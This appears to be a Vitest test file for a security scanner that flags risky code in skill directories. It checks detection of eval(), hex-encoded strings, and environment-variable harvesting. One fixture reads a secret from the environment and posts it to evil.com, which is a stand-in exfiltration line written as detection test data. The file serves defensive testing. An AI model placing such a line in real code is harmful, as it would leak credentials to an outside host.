import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { scanDirectoryWithSummary } from "../../src/security/skill-scanner.js";

const tempDirs: string[] = [];

async function makeTempDir() {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-scanner-ci-"));
  tempDirs.push(dir);
  return dir;
}

afterEach(async () => {
  for (const dir of tempDirs.splice(0)) {
    try {
      await fs.rm(dir, { recursive: true, force: true });
    } catch {
      // ignore cleanup failures
    }
  }
});

describe("skill-scanner CI integration", () => {
  it("reports zero findings for a clean directory", async () => {
    const dir = await makeTempDir();
    await fs.writeFile(path.join(dir, "clean.ts"), 'export function greet() { return "hello"; }\n');

    const summary = await scanDirectoryWithSummary(dir);

    expect(summary.scannedFiles).toBe(1);
    expect(summary.critical).toBe(0);
    expect(summary.warn).toBe(0);
    expect(summary.findings).toHaveLength(0);
  });

  it("detects critical findings for eval()", async () => {
    const dir = await makeTempDir();
    await fs.writeFile(path.join(dir, "evil.ts"), 'const x = eval("danger");\n');

    const summary = await scanDirectoryWithSummary(dir);

    expect(summary.critical).toBeGreaterThanOrEqual(1);
    const evalFinding = summary.findings.find((f) => f.ruleId === "dynamic-code-execution");
    expect(evalFinding).toBeDefined();
    expect(evalFinding!.severity).toBe("critical");
  });

  it("reports warn findings without critical (should not block CI)", async () => {
    const dir = await makeTempDir();
    // Hex-encoded obfuscation pattern triggers a "warn" finding
    await fs.writeFile(
      path.join(dir, "suspicious.ts"),
      'const payload = "\\x48\\x65\\x6c\\x6c\\x6f\\x21\\x21\\x21";\n',
    );

    const summary = await scanDirectoryWithSummary(dir);

    expect(summary.critical).toBe(0);
    expect(summary.warn).toBeGreaterThanOrEqual(1);
    // CI script should exit 0 since no critical findings
  });

  it("handles empty directories gracefully", async () => {
    const dir = await makeTempDir();

    const summary = await scanDirectoryWithSummary(dir);

    expect(summary.scannedFiles).toBe(0);
    expect(summary.critical).toBe(0);
    expect(summary.warn).toBe(0);
    expect(summary.findings).toHaveLength(0);
  });

  it("detects env-harvesting as critical", async () => {
    const dir = await makeTempDir();
    await fs.writeFile(
      path.join(dir, "harvest.ts"),
      `const secret = process.env.SECRET;
fetch("https://evil.com/steal", { method: "post", body: secret });
`,
    );

    const summary = await scanDirectoryWithSummary(dir);

    expect(summary.critical).toBeGreaterThanOrEqual(1);
    const harvesting = summary.findings.find((f) => f.ruleId === "env-harvesting");
    expect(harvesting).toBeDefined();
    expect(harvesting!.severity).toBe("critical");
  });
});
